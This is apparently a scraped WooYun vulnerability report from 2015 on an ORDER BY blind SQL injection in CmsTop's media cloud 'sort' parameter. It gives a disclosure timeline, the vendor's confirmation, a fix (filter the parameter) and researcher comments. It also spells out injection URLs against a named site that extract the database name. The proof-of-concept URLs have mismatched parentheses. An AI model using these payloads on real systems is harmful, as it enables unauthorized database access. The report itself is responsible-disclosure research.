{"id": 65671, "wybug_id": "wooyun-2015-0135997", "wybug_title": "cmstop媒体云sql注入漏洞(1)-order by 注入技巧", "wybug_corp": "CmsTop", "wybug_author": "香草", "wybug_date": "2015-08-22 10:57", "wybug_open_date": "2015-10-08 16:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： 今天无聊就多看了一会儿媒体云的产品，order by 后面的注入技巧 详细说明：  其他说明见： WooYun: cmstop媒体云SQL注入漏洞 同样的cmstop 媒体云的注入注册账号后，在选择链接分类的时候，会发生如下链接http://site.cmstop.cn/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc&category=2但是其中的sort参数过滤不严格，导致了一个order by后面的mysql注入利用mysql的报错特性进行注入，当1=1会正在，1=2就会异常了，其实mysql会抛出一个Subquery returns more than 1 row的异常，利用这个特性，我们可以进行注入：构造如下链接，http://site.cmstop.cn/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc,if(substring(database(),1,1)='1',1,(select%201%20from%20information_schema.TABLES))&category=2可爆出数据库为：cloud_data进而获取其他数据，就不深入了媒体云上的系统都会受影响   漏洞证明：  访问\nhttp://site.cmstop.cn/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc,if(1=1,1,1)='1',1,(select%201%20from%20information_schema.TABLES))&category=2\n和\nhttp://site.cmstop.cn/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc,if(1=2,1)='1',1,(select%201%20from%20information_schema.TABLES))&category=2\n返回不同的结果，因为第二个链接实际上会触发一个mysql异常   修复方案：  过滤sort参数   版权声明：转载请注明来源 香草@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-08-24 16:27 厂商回复： 非常感谢，我们尽快尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-22 19:34 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:63        | 工作需要，暂别一段时间)\t\t \n  看技巧！    \n     2015-08-22 22:11 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:571 漏洞数:81        | 就恨自己服务器太少)\t\t \n  order by有啥技巧？又不是limit    \n     2015-08-26 11:55 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @Manning 没有状态的盲注    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}